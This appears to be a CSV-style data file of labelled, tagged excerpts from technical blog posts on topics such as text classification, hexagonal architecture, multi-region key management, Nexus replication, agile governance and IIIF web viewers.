1031,"[Shout out to Kyle Babinowich for helping me write this post! ]Black Friday is just around the corner, and if you are like me, that means slipping into a food coma from Turkey Day leftovers and building a large online shopping cart of useless items on Amazon (I personally avoid the brick and mortar store madness). As exciting as this might sound, I always feel like I could be doing something more productive with my time. Watson Natural Language Classifier (NLC) is the easiest way to get started with text classification. Lets take a look at three use cases to help e-commerce websites and retail applications make some significant upgrades with natural language processing (NLP) and machine learning (ML) capabilities. This post is going to cover the following topics and in each section there are sample data set links to help you get started trying out NLC: Improving search with intent classification for common queries Product categorization for search and improved cross-sell Categorizing product reviews to improve user experiences and gain customer insights Raise your hand if you get tired of continuously having to apply filters to a retail page because the search results are subpar. Why do websites put us through this tedious experience? If their data is categorized for filters, shouldnt it be searchable? Traditional search techniques are great at finding matches to keyword searches but not great at interpreting question intent or short queries. That is where NLP and ML can come in handy.","['Machine Learning', 'Classification', 'Tutorial', 'Getting Started', 'Search']",2
1032,"One of the most common use cases for NLC is intent classification. The service excels at deciphering intention in order to convert unstructured questions into structured queries. This is a core component that underlies chatbot technology (check out Watson Assistant). Intent classification is different than more traditional text classification because user queries are typically very short, ambiguous, and may belong to multiple categories (check this paper out). This requires services to leverage different parameters and techniques when tackling problems like document classification compared to intent classification. Additionally, using intent classification is not solely dependent on the frequency of keywords, or other elements, that are common in traditional search techniques, and are able to provide more precise, intuitive responses by using supervised learning.","['Machine Learning', 'Classification', 'Tutorial', 'Getting Started', 'Search']",5
1033,"Companies like Amazon use a variety of techniques to improve the customer experience for their users. The above gif demonstrates how Amazon provides categories for users to evaluate similar reviews. By displaying the most common categories, Amazon allows its customers to determine if the product he/she is reviewing is reviewed in a positive way. As you can see, although there is a category called easy to use non of the top reviews under that category mention easy to use as a single phrase. This is the power of using text classification. Amazon is able to define its categories from mining millions of reviews and then train its system to organize reviews into those categories.","['Machine Learning', 'Classification', 'Tutorial', 'Getting Started', 'Search']",6
1034,"This is what I see missing from software architecture today. Its missing from the essays and the posts, from the books and definitely from the job descriptions. The Wikipedia article is particularly illustrative: That reads like it was written by robots so boring theyd be booed out of insurance seminars (and strongly echoes the wording of Perry and Wolf). The closest we get to people in many descriptions is the statement that the software architect has to deal with people, and cant be the type of engineer who doesnt like politics. This phrase from a recent job description I read is actually common enough that it illustrates how weighted the pool of employees is against those with the ability to interact with other human beings.","['Design', 'Software Architecture', 'Architecture', 'Software', 'People']",12
1035,"Im not going to change our definition of software architecture. Thats neither my desire nor something I think I can actually accomplish. And I know it wont be anything as amazing as 99% Invisible. Im not creating anything big, Im simply going to cut across a lawn to get closer to people. If enough folks follow me, maybe well make a path others can follow more easily.","['Design', 'Software Architecture', 'Architecture', 'Software', 'People']",12
1036,"Heres the (heavily modified) use-case: You are an online store. If you ever used Instacart, imagine that. Users can create an order and add items to an order. They can then schedule the order or cancel the order. If the order was canceled, you cant add items to it. Even if you are logged in on another device that has the order open. Users need to get an error.","['Big Data', 'Kafka', 'Data Architecture', 'Data Engineering']",17
1037,"As we can see above, to differentiate the records, we need to know which attribute is unique to the related object and its expected value. For example, if a record is an expense record, then it is expected for the record to have an expense Detail attribute and its value is not null. On the other hand, if a record is a master record, then then it is expected for the record to have an entry Name attribute and its value is master. With this specific attribute and value we can be sure that the queried records In implementing the second application, we tackled trick 2 of differentiating which Expenses records belong to which applications. To differentiate expenses records from the second application, we created a constant called app Number with the value of 2. This constant serves as an ID of the application and will become an attribute of the Expense object. The idea of the use of this constant was to give expenses records from the second application a specific attribute to identify which application they belong to, with a specific value depending on the application. Below, we will show the picture of app Number implementation in the controller.","['Software Architecture', 'Mongodb', 'Spring Boot', 'Software Engineering', 'Database']",8
1038,"As the name suggests, KMS is a key management service. The main feature of KMS is to securely store encryption keys on your behalf and provide encrypt/decrypt endpoints using an encryption keys unique ID, never exposing the value of the encryption key outside of KMS. That is great, but there is a catch: you can only encrypt up to 4KB of data! You might ask: but what if I want to encrypt 10GB of data? Do I have to make 2,500,000 (10GB / 4KB) calls to KMS?! The answer is you could but please dont. To overcome this limitation, lets borrow a classic encryption pattern: use the master key managed by KMS to encrypt/decrypt a small key (called data key going forward), which will be used to encrypt/decrypt any data, large or small. This way, we do not need to deal with the size limitations of KMS; we just need to keep track of the encrypted versions of the data keys.","['Encryption', 'AWS', 'Reliability', 'High Availability', 'Distributed Systems']",11
1039,"Lets look at what RKMS does during a get Key(String id) in more detail: The above algorithm is pretty solid, but we need to consider that RKMS is going to be deployed as a replicated stateless service. This means that a request can go to any instance of RKMS, implying that there is a chance the same request could go to 2 different instances at once, if 2 different store service instances make the same request at the same time. This is pretty common because a tenant might be saving multiple keys at the same time, on different store service instances. In this situation, if the encryption data key already exists in RKMS, everything is fine. However, if a key has never existed, this leads to RKMS instances trying to create a data key for the same id at once, but each instance will generate a unique data key, unequal to the other instances generated data key. This leads to a big problem! Lets take a look at an example scenario: lets say the same request goes to 2 of our instances: r1 and r2. Both instances check the database and find no id encrypted data keys mapping, so they both request a new data key from KMS. Notice that the data key r1 gets from KMS will not be the same as what r2 will receive.","['Encryption', 'AWS', 'Reliability', 'High Availability', 'Distributed Systems']",11
1040,"Once it receives and encrypts the data key in all regions, r1 will save its set in the database and return the plaintext data key k1. Then, r2 finishes its tasks, saves its set in the database, and return the plaintext data key k2. At this moment, the clients of r1 and r2 will encrypt user data with 2 different keys, and in the future, when they want to decrypt that tenants data, they will always use data key k2 because that was the last data key saved in the database. For that reason, we will never be able to decrypt the data that was encrypted with data key k1! In order to solve this situation, we need to allow only one of these requests that are happening at the same time to succeed. One might think of using locks to prevent another RKMS instance from getting into the creation phase, but that will require coordination between the instances, which will slow our service down. Instead, what we could rely on is conditional writes provided by the database. Conditional writes are write operations that only happen if a certain condition is met. In this case, we can write to the database, with a condition that a value does not already exist for the given id. As a result, going back to the above example, when r2 tries to write to the database, its write will actually fail because a value exists in the database, put there moments ago by r1.","['Encryption', 'AWS', 'Reliability', 'High Availability', 'Distributed Systems']",11
1041,"You may have noticed that when a data key already exists, we only need 1 regions KMS to be up in order to fulfill the request. However, in order to create a data key for a new id, we need all regions available. This increases our risk of losing availability for key creation. Even though a solution is not yet implemented in RKMS for this problem, a possible solution is to allow data key creation with failure in some regions. For example, we could just require 2 out of 3 redundant regions to be available during key creation, so there wont be a single point of failure. This will lead to saving fewer regions encrypted data keys in the database, so when needing the data key, you can only rely on regions that responded during the key creation. In order to increase the number of regions that can be used, one could also deploy a separate scheduled job which sweeps through the database to find incomplete rows and encrypt the data key for each row in its missing regions.","['Encryption', 'AWS', 'Reliability', 'High Availability', 'Distributed Systems']",11
1042,I recently saw an interesting video of a lecture by Dr. W. Edwards Deming where he spoke about his infamous Red Bead Experiment. The simple premise is a factory that is represented by a box full of beads. 80% are white and 20% are red. Workers were asked to dip a paddle into the box of beads and bring it out with 50 beads in small holes. This is what it looks like.,"['Software Development', 'Software Testing', 'Testing', 'Management', 'Development']",5
1043,"The customer of this factory demands that there can be no more than 5 defects (or red beads) in each shift (or paddle load). You can watch the video here to get the whole idea. Red Bead Experiment with Dr. W. Edwards Deming In Demings original experiment, there were people at the end of the production line counting the red bead defects and others who recorded them. We are told that the customer will cancel the project if they see too a high number of defects delivered. The experiment shows that while the process may be flawless, we can still see a lot of variation in the output on a day to day basis.","['Software Development', 'Software Testing', 'Testing', 'Management', 'Development']",5
1044,"I joined a team in Microsoft which was working on V1 version of TFS (now called azure Devops server) as a SDET(software developer in test). SDET responsibility was to provide framework, tools and tests to test the product. My first year was a lot of learning of this new organization, platform(windows), language (c#) and dev tools. After we shipped the first version, I felt that I had learnt everything and should work on something else. My then manager was leaving the team. He had seen both my technical abilities and management skills. He said these words that I still remember. Your career will not be similar to any others, consider you are in a jungle with no paths, use your machete and find your own path.","['Leadership', 'Careers', 'Technology', 'Experience', 'Software Engineering']",2
1045,"Every time I felt bored and not challenged enough there would be re-org and I would work under a different part of the product. A lot of people left, a lot of managers got changed. Over time my accidental decision of staying in the team worked. Your career is a train journey, a lot of people will join and leave the journey, the things I look for to stay in the team are1. Am I happy to go to work in the morning? I am happy if I am learning and challenged and so occupied that I have no room to second guess.2. Am I working with smart people that I can learn from?3. Do I believe in the leadership and long-term vision of the product? After a couple of years, there was an opening to become the lead of the team I was in. When I was an individual contributor, I had no interest in becoming a manager. I was also selected to be part of a HIPPO(High potential) program in Microsoft. This gets you a chance to speak with an HR about my career. I still remember telling this HR that I had no interest in management and she had challenged me to try it.","['Leadership', 'Careers', 'Technology', 'Experience', 'Software Engineering']",0
1046,"When a lead opening opened, I jumped in and accepted it. I took it because I was ready for a change. There were some changes I had to learn. It was not about me anymore, it was about the team and how we could work together to achieve the result. It was about understanding your team members and aligning them with the right work. Tech managers are a little different, you are more of a leader and mentor than anything else. This was another interesting journey about handling performance review, letting go some people and learning to hire right people. One thing I tried to change when I was SDET lead was how the SDE and SDET role worked in Microsoft. I had written a doc and given to our director on how SDEs should write more unit tests to test functionality and SDET role should be more about providing tools and framework.","['Leadership', 'Careers', 'Technology', 'Experience', 'Software Engineering']",0
1047,"Ironically, this change did happen in a much bigger scale. SDET and SDE roles got merged. Each org took their own approach of letting go SDETs or merging them to Engineering roles. In our org, they let some low performers go and merged the others into one engineering org. This was absolutely needed and the best change I have witnessed. But it also started off another journey for me. I was already at a higher level in my career and I was a lead for 4 years. I was offered IC role again. I choose to stay because I always wanted to be an engineer on the product and this was a great opportunity and all the 3 points I said before still checked. Next two years I had to re-prove myself as an engineer on the product. I never doubted myself, but there where already established senior engineers who were getting best projects. Luckily this changed when both the senior engineers left. They had no choice but to rely on me. Over the next 2 years, I became the most important engineer in the team. From training new comers, to handling the most important features, to handling live site issues and becoming the only female engineer on call and resolving them quickly. I enjoyed this time and learnt a lot but was edging to comfort already. This was also time when the team went through agile transformation and shipping our VSTS service every day from a 2-year box product. We also did some big engineering cycles in fixing our dev tools, we moved our version control system to GIT and changed our building technology from razzle to modules.","['Leadership', 'Careers', 'Technology', 'Experience', 'Software Engineering']",2
1048,"I was already in talks with my second level manager to consider me for engineer manager role when one opens. It did and I became engineering manager. Next 2 years really transformed me from being an engineer-engineer to engineer-intrapreneur. I now look at technology as a means to providing the right customer solution. I have read lot of good books like lean startup, innovators dilemma, good to great. I was learning to be best manager I could be. Over the years I also became really good at hiring the right candidates for my team. Maybe more on it in another story. I was also participating in college recruiting and was made the hiring manager for SWE interns for entire developer division.","['Leadership', 'Careers', 'Technology', 'Experience', 'Software Engineering']",2
1049,"My long time in the team made me an expert at both technology and product. I could also see the results of good and bad decisions and how it affected the product over time. Because of the deeper insight I can now make better, bigger impact full decisions and connect the dots. Throughout this journey I never followed anyone manager or mentor. I just stayed true to myself1. Kept learning through observing my co-workers, seeking the right mentors and reading books If you are new to tech industry. Here is my quick piece of advice. Dont seek to be CEO overnight, just enjoy and learn every day, you will find your own path. Be curious about everything, dont use your designation as a wall. Seek and use feedback carefully and stay true to yourself.","['Leadership', 'Careers', 'Technology', 'Experience', 'Software Engineering']",0
1050,"When that didnt work (and it wouldnt, of course), the typical response would be to tighten the screws. Make the procedures even more detailed. Limit the choice of restaurants to an approved list. Add bureaucracy to manage the approved list. Add some quality gates where work in progress can be inspected by accountable personnel. Punish the accountable personnel if they dont find anything wrong, as something surely must be wrong. Increase the penalty for late arrival.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",13
1051,"Other solutions become evident once we start to think outside the corporate box. For instance, we could duct-tape the four people together. Wherever they go, they go as one. That simple change increases the probability of on-time arrival from 1 in 16 to 1 in 2, an 8-fold improvement. What consultant wouldnt be proud of an 8-fold improvement? Consultants call that sort of thing low-hanging fruit. Ill bet we could get a client testimonial out of it, too.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",1
1052,"Another possibility, and one that might appeal to Millennials, is to have dinner delivered to each person individually, and let them interact via social media. That imperfect solution still requires synchronous engagement and a degree of personal interaction, neither of which Millennials crave. Dinner 2.0 might include the ability to record and playback ones participation in the event, represented by an AI-equipped avatar. That way, everyone eats when and what they please, without the burden of trying to hold up their end of a conversation. Each can play back the experience on demand, or just let the avatars get together in virtual reality and leave it at that. No need to venture out into meatspace at all.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",17
1053,"Just for grins, lets pretend the four resources who are planning to meet for dinner are actual humans. How can they solve the problem of erratic arrival times? One way I like to solve problems is not to solve them at all, but rather to change the parameters of the situation in such a way that the problem winks out of existence. In this case, we could agree to meet at a conveyor-belt restaurant. Dinner is served continuously, so it doesnt matter exactly when each person arrives. No best practices, formal procedures, duct tape, or Departments of Dinner Planning are necessary. Its definitionally impossible to arrive at the wrong time because there is no wrong time. (Dont be alarmed by that gentle tingling sensation in the back of your skull. Its merely the firing of neurons that are associated with your understanding of continuous flow, small batches, and pull systems. )What if it isnt four people who want to meet for dinner. What if its four teams that contribute to the creation of a product. And what if arrive on time means deliver your piece of the product when the teams that depend on you expect and need it.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",4
1054,"Things get worse instead of better. Maybe they arent using the framework well. Maybe theyre using it well enough, but they arent doing enough of it.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",12
1055,"One of the things that attracted me to Leading Agile was the emphasis on structure, governance, and metrics. Structure is just what it sounds like. Governance, in Leading Agile parlance, isnt about regulatory compliance; its an umbrella term for all sorts of process and procedures. Its the governance of all your work. And metricswell if you havent measured anything, then how can you possibly know whether youve improved anything? Speaking of metrics, theres one that I like quite well. Its the ratio of value-add time to total lead time. Its interesting to figure this one out in IT organizations. Most people tend to guess their processes are 70% to 80% value-add and 20% to 30% waste. It turns out that process cycle efficiency is in the 1% to 2% range in most IT organizations. And if you examine the impact of cross-team dependencies, youll almost certainly find that its the single greatest cause of waste.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",12
1056,"We can do even better than that. We can organize people around value streams. A value stream comprises all the actions necessary to deliver some form of value to customers. In the IT field, a value stream may be a more expansive concept than any single product or product line. Sometimes, we can structure the organization like a conveyor-belt restaurant of value. )It isnt difficult to gain agreement from organizational leaders about that idea, at least on a conceptual level. Why, then, do they persist in creating processes, procedures, and standards that restrict their ability to take full advantage of it? On occasion Ill ask people to play a little game. Describe or draw how you would rescue them from the rushing water. People usually come up with something like this: What happens in this scenario is that victims are slammed into the rope with the full force of the rushing water, quite likely knocked unconscious, and then they drown and/or get splattered by debris, such as automobiles and parts of buildings. They have a single, split-second opportunity to grab the rope, a feat which will require significant physical strength and exquisite timing under life-or-death pressure, when theyre probably already injured, exhausted, and terrified. The odds are very much against them.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",0
1057,"But what if we wanted to do something effective, as opposed to just any old something? Observing the way the universe appears to work, it seems we would want to go with the flow and use natures power to help us achieve the goal, rather than fighting against nature. Like this, perhaps: What happens in this scenario is that people are carried downstream to the rope, which is stretched across the flowing water at an angle. They need not grasp the rope firmly but rather use it as a guide to reach the shore. They might just bump up against it repeatedly. The current pushes them downstream and the angled rope nudges them sideways. Theres a reasonable chance many will survive. If a car comes floating along its probably best to lift the rope out of the water to make room, or (worst case) let go of one end of the rope and throw it back across after the car passes.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",4
1058,"This may sound reasonable and it may be based on the way the universe really works, but its uncomfortable for many people nonetheless. Well, people generally want answers, not more questions. This view of reality means our favorite Methodology or Framework cant be the Final Answer Forever, that we can lock in and operate on autopilot. There is no Final Answer Forever, thanks to the #1 fundamental characteristic of existence: Constant change. Rather than a Final Answer Forever, what we need is a set of guidelines for adapting to change at scale.","['Agile Transformation', 'Scrum', 'Change Management', 'Software Development', 'Governance']",4
1059,"Peoples image of artists is often of lives of relaxing creativity. The reality is they develop a routine and consistently follow through. Pulitzer Prize winner, Maya Angelou, would get up at 5:30 a.m. every day and start writing at 7 a.m. for five or more hours. As Michelangelo concluded, If people knew how hard I worked to get my mastery, it wouldnt seem so wonderful at all.","['Software Development', 'Technology', 'Career Advice', 'Art', 'Self Improvement']",4
1060,"In one of the companies I worked for, my team has been asked to port an old application on a brand new stack (like moving from an EAR/SQL app to a self-contained/No SQL one). By studying it, we quickly realized that we had to redo the entire infrastructure the new frameworks were so different from what was used ten years ago. In fact the only thing that didnt have to change was the business logic. So it makes sense to reuse it, right? After a deeper look, the maven module named model was only POJOs, totally anemic and although there is also service module, the business logic is shared across all the layers, drowned in a lot of technical code (DAOs creation, Serialization, Pool management, etc). And no way to properly extract this, some parts of the business were relying on the technical behavior of the old framework we tried to remove. Because there was no clean separation between the technical code and the business logic.","['Hexagonal Architecture', 'Software Architecture', 'Domain Driven Design']",10
1061,"We searched for a mean to achieve this separation, in a way that if one day we have to change again the stack, we can reuse totally the business logic. And one of our colleagues told us about the Hexagonal Architecture. One of the key concepts of this architecture is to put all the business models/logics into a single place. So if I go back over the previous schema we would have something like this: Another key concept is the domain depends on nothing but itself; this is the only way to ensure that the business logic is decoupled from the technical layers. How do we achieve that on the previous schema? The domain clearly depends on the persistence layer! Well by using a pattern you may know: the inversion of control. If we redo the previous schema with thisby calling the domain the Hexagon because Alistair Cockburn (creator of the Hex Arch) loves the shapewe will have something like this: Ok the inversion of control was pretty magic, we will see later how it works. But now you got an overview of what is the Hexagonal Architecture: Only two worlds, inside the Hexagon with all the business models/logics, outside the Hexagon: the infrastructuremeaning all your technical code.","['Hexagonal Architecture', 'Software Architecture', 'Domain Driven Design']",8
1062,"In order to ensure the isolation of the Hexagon, the dependencies on downstream layers have been inverted. The trick is in fact pretty simple as you can see: The outside of the Hexagon (the infrastructure) is divided in two virtual parts, the left side and the right side. On the left, you got everything that will query the domain (the controller, the REST layer, etc.) and on the right, you got everything that will provide some information/services to the domain (Persistence layer, third party services, etc.). To let the outside to interact with the domain, the Hexagon provides business interfaces divided in two categories: The API gathers all the interfaces for everything that needs to query the domain. Those interfaces are implemented by the Hexagon.","['Hexagonal Architecture', 'Software Architecture', 'Domain Driven Design']",14
1063,"The Hexagonal Architecture is also called the Ports and Adapters architecture. It comes from the power of the modularity of this architecture. Because everything is decoupled, you can have a SOAP, REST and JMS layers in front of your domain at the same time without having any impacts on it. On the SPI side, you can change from a Mongo DB driver implementation to Cassandra if needed. Since the SPI wont change because you change the persistence module, the rest of your software wont be impacted. The API and the SPI are the Ports and the infrastructure modules using or implementing them are the adapters.","['Hexagonal Architecture', 'Software Architecture', 'Domain Driven Design']",10
1064,"My advice is writing your functional/acceptance scenario first in a BDD/ATDD way. Then write the API interface which will be the entry point of your feature. Implement your tests (TDD for the win!) and after implement your business logic. You might need to define an SPIto retrieve some data from the database for examplethats fine go with it. And since the right side is not yet implemented, create a stubbed implementation of the SPI inside your Hexagon (e.g. an in memory database using a Hash Map).","['Hexagonal Architecture', 'Software Architecture', 'Domain Driven Design']",15
1065,"To finish on this, always be pragmatic when you adopt a new technology. As stated before, the Hexagon must not depend on any technical framework, but exceptionally you can. For example in our case the Hexagon had three exceptions: Apache Commons Lang3 (String Utils), SLF4J and the JSR305 of Findbugs. Because we didnt want to create the wheel again and we felt that those frameworks had very low impacts on the domain. One good side effect of Hex Arch is that you keep challenging yourself before integrating a new framework. Before Hex Arch we got about fifty dependencies for the domain and it has been reduced to three or four of them. This is very good from a security perspective.","['Hexagonal Architecture', 'Software Architecture', 'Domain Driven Design']",9
1066,"What we just described basically looks like a message queue. Each repository should respond whether it has the artifact in cache. The problem is that were limited by the functionality embedded into the repository software. We have: Hosted repo (this is our write repository, basically)Proxy repo (this one will fetch from local cache if present, otherwise will fetch from remote)Group repo (this type basically groups other repo types into an ordered sequence)We dont want the actual request to go to the real source for performance reasons: its much faster to check all the other replicas caches first. The proxy repo sounds like something we want to use, but it has one flaw: when you set it up you have to provide the write repo, and in case something is missing in the local read-only repositorys cache it will always fall back to the write repo. So, if we specify each Nexus to proxy each other, then the following is possible: suppose we have a request that is coming from a Load Balancer to the first replica, and it just so happens that there is no data cached. It then goes to the source: the second replica. The second replica has the same problem and accesses the third, and so on. This can lead to a long chain of requestsin the best case scenarioand a loop in the worst case: So, basically we want to change the logic as follows: If the current Nexus is accessing another Nexuss proxy repository we want the second one to be aware that its being used as a read replica If the current Nexus is requested to check the contents of a proxy repository, then we want to check only the cache, not the write repository These requirements lead us to a couple of ideas: We can use the User-Agent header to identify whether were being accessed by another Nexus instance We need to modify the code so that if were accessed by something with User-Agent of Nexus then in the proxy repo implementation we should only check the cache and return early. The actual code change will look something like this: After checking the cache we just verify the User-Agent header, which for Nexus should start with Nexus/. Unfortunately, if we just return null, the negative caching will take over next time: suppose we first get a 404 response by only checking the cache. The negative cache will store this, and even though the next time we might want to check the write repository, it will still return 404 for the TTL duration of of the negative cache. This is not what we want: each time the other Nexuss cache is checked it should bypass the negative cache all together.","['Docker', 'Nexus', 'High Availability', 'Kubernetes', 'DevOps']",7
1067,"Automating the configuration of Read-only Proxies is vital: no-one wants to manually configure three instances of Nexus. Fortunately for us, Nexus has an API for loading scripts. Each script has an API to create and manage different repositories. These scripts are written in the Groovy language. When you execute the script, you can send a data file to it. Examples of what you can do with these scripts can be found in official sources. [1] [2]So, configuring the system will be split to two parts: The external script prepares the list of created repositories and passes it to the internal (loaded into the Nexus) script A script inside the Nexus creates repositories according to the prepared list If we decide to use YAML as data file format it will look something like this: In this case the loaded script can be as follows: Repositories of other types (Ruby Gems, Docker, blob etc.) are created exactly the same way, but for each of them there is a separate function in the API with a slightly different set of parameters.","['Docker', 'Nexus', 'High Availability', 'Kubernetes', 'DevOps']",7
1068,"This is a bit of a simplification. Research papers will talk about eventual consistency, commutative & idempotent conditions, the need for a central server, All this academic literature has proposed a plethora of protocols and algorithmssome more legit than others (see article below). For the sake of conciseness, we will not delve deeper into that matter and simply say that they can be classified in either one of the two following categories: Operational Transformation (OT) represents the document state as a sequence of operations. Every operation is created on top of a local snapshot. Now, imagine that the operation is sent to a peer, that made an edit in the meantime. That peer will have a different snapshot, so the operation first needs to be transformed before being applied. This is the essence of how OT works.","['Draftjs', 'Collaboration', 'React', 'Sharedb', 'JavaScript']",8
1069,"We were happy in the end to discover that it was the right choice:-)Conode is a single-page application, which uses React+Redux. The text editor is based on the famous D __url__ framework. It does not offer much out of the box, but according to their own words ""In Draft.js, everything is customizable. ""The problem is that D __url__ is not made for collaborative editing. This has to do with the fact that its API mostly exposes State and not Operations. The community actually seems divided on the issue. In the end, whether it is doable or not, depends on your functional and performance requirements.","['Draftjs', 'Collaboration', 'React', 'Sharedb', 'JavaScript']",19
1070,"Both of these approaches are a long way from the single page web app, where the payload delivered to the browser is mostly application code rather than a structured HTML page. The application reads in data and more resources to build the user experience. As the user interacts with the application, it loads further content via Java Script and modifies the users view. This approach has benefits too, and not just for making slick interfaces. Many of the global population of web users have very capable web browsers on their smart phones or tablets, but poor network infrastructure. Java Script-heavy applications can squeeze every last bit of potential out of limited bandwidth, but must take care that the initial load of the Java Script code itself is not a burden. If done carefully, a Java Script single page app can be both more efficient and a better user experience.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1071,"These concerns come to a head when it comes to the user experience of digitised content like paintings, maps, books and manuscripts. And it gets more complicated for complex digital objects: those with many distinct views, such as a book with many pages, each with potentially more content, like a text transcript of the page. These objects are most commonly experienced through Java Script-powered viewers, like these: Applications like the Universal Viewer deliver many and varied rich viewing experiences. You can get an overview of a complex object through thumbnails and structural navigation. Sometimes you can read the text, or even search within it. Some are interactive and allow annotation, sharing, embedding and more besides. Some will even plaster the pages of your object over the walls of a virtual gallery, in which you can wander from room to room, chapter to chapter.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1072,"Now consider viewers as the means by which an organisation exposes its digitised books, manuscripts and archives. Typically a viewer application lives on a web page about the single object the viewer is showing. Maybe its the library catalogue page for a book and the viewer lets you read it right there by exploring the pages. Its rare to have an entire collection behind a single URL: individual objects usually get their own web pages. But once inside an object you are navigating from page to page, view to view in an experience driven by a Java Script applicationan island application, autonomous and self-contained on one web page. It has most of the traits of a single page web application, its just that theres one single page application per object.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1073,"At this point the Java Script approach looks a lot friendlier again, especially if we take our bandwidth optimisation to extremes. If you look at the source, this viewer is only 1.6 KB with no dependencies. Thats absolutely tiny, and takes milliseconds to load: This viewer is an experiment in how-small-can-you-get rather than a serious candidate for a viewing experience. But adding a few more KB of code and CSS to it would make it prettier and even more efficient (e.g., only loading thumbnails visible in the left panel and deferring the others until they are scrolled into view). A much bigger jump in capability (but still no larger in its contribution to the page weight than a typical medium sized JPEG) would be to add deep-zoom support, and/or the ability to tailor the sizes of the requested images to the users screen. Its then better for mobile users, much faster to load, much friendlier to low-bandwidth users (deep zoom is also a great bandwidth conserver, allowing hi-res access to images of enormous size by supplying only those image tiles required to populate the viewport).","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1074,"A simplistic approach to progressive enhancement means our HTML version of a large object is just too big, and will result in a worse user experience for all users (because of the initial page load). The experience will likely be especially bad for those were trying to help most by adopting the practice! So why not break it up into separate pages, one for each view? So how did people solve this before Java Script viewers became the norm? Sometimes, especially with archives digitised a while ago, the web site is delivered in plain HTML: As we would expect from simple HTML, this page of Persuasion is a first-class citizen of the web. For me, its the second hit in Google, and theres the text I searched for, as a snippet in the result: That is, I was able to find a search result specifically for this page of Persuasion (distinct from the manuscript it belongs to). To explore the issue a little more, the first hit in Google for this same query is also a distinct web address for a page at the British Library that contains, as plain HTML, the text of the entire 33 pages of the item; images of these pages are launched in a separate viewer, in which I need to navigate to for the deep zoom experience. But I cant get a search result that leads into that viewer.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1075,"The trouble is, we dont necessarily know what the users context is, and how important a page-centric web view might be to them. And if our enhanced version is a Java Script viewer that stays on the one page, how do we reconcile these two world views? Some users (including robots and crawlers) see a work across multiple web pages. Other users, benefiting from the Java Script-powered features of the viewer as it loads and traverses the digital object quickly and smoothly, experience it from the point of view of one page only. What happens when these users send links to each other to compare notes? We started from a purely practical concern for reducing bandwidth consumed, and ended up with a different approach that spreads the viewer across many web pages. We now have a different user experienceweve added a web-page-centric experience that elevates each view within the work to its own page with an address on the World Wide Web.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1076,"I have written elsewhere about the userss different focus of attention when looking at objects and their views. The problem of focus is that you dont know whether a web page per view or a web page per work is going to feel more natural and useful to a user, because you dont know what they are there for. Even the same user may have a different focus at different times. For one user, a single manuscript page of Newtons Principia may involve months of scholarship. All of the transcriptions and annotations available for that page definitely warrant a distinct web address, its a rich island of web content on its own. It should turn up in search results as a resource in its own right, it should have the status on the web as a page, all to itself.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1077,"But that same publishing mechanism would result in every page of every digitised printed book getting its own web address too. This might be overwhelming, as search results, or as a navigation experience. For the user riffling through (digitally) or just reading, the web page belongs to the Persuasion manuscript as a whole, the work, and they are inside it, somewhere inside a viewer on the Persuasion manuscripts web page. Separate web pages, image after image, could seem unnecessarily clunky, especially if there is little or no additional content (transcriptions, annotations). Why didnt they use a viewer? Is it possible to construct a user experience that allows both kinds of focus at the same time? To have all the benefits of separate web pages and all the benefits of a single page viewer, without the user having to think about that distinction at all, or suffer the drawbacks of each approach?","['Web Development', 'User Experience', 'Digitization', 'Iiif']",17
1078,"In a pilot project we developed for the Royal Society called Science in the Making, we decided that the archival material, and the interactions offered to users, warranted a web page per view rather than a web page per object. The site features archive material connected with published articles in the Philosophical Transactions of the Royal Society, the worlds oldest scientific journal. These items are original manuscripts, drawings, referee reports, photographs and correspondence. Although the pilot was aimed at the general public (leaning towards a viewer), users can transcribe and comment on individual images within a work (leaning towards one web page per image). How much of a viewer-like experience could we deliver for most site users, while keeping each view a distinct web page, with its own URL? We wanted to make sure any transcription text for an image was discoverable by search engines, as part of the HTML content of a specific page. If someone is working on transcribing a page of a manuscript, can it be a real web page? And if they are just browsing, skimming through images in a work, can it feel like a viewer? A web page for the work looks like this: This page carries catalogue data for the object, some tags from users that belong to the object, and a strip viewer that gives an overview of the work. You can scroll or swipe it.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",6
1079,"If we view the transcription, were seeing text thats basic HTML content of the page. Search engines can find it and index it: For this pilot, time was limited and the experiment didnt deliver a full progressive enhancement approach. The basic HTML of the page provides a large JPEG and the thumbnail images; they are all simple HTML links. You can navigate around quite easily in this viewer with no Java Script and fairly light page load times. We would like to do a lot more optimisation for the basic HTML layout, and it still suffers from the problem of scale mentioned above. Were lucky in that the archival material for the pilot project is seldom bigger than a few dozen pages, the total page weight doesnt become too big. We never have unmanageable numbers of thumbnails. But the raw HTML for these pages, and the page weight that HTML causes, would be too large if this site were showing 500-page books.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1080,"This means a server side viewer, generating web pages per view within a work, with enough navigation to get to any other view (but not always in one step). It doesnt have to provide the entire work, it doesnt have to provide every possible thumbnail. Just enough of an HTML window on the work, at that view, with perhaps the thumbs around the view, with perhaps with the start and end thumbs as well, but not necessarily all the thumbs in between. And similarly for a table of contents: a tree opened to the current section, but not opened (or even open-able) to all sections. No matter what page you land on, you can see the page image, other relevant page content, commentary and editorial; you can navigate up, down and around. This HTML experience is just fineit should be a good one, not an afterthought.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
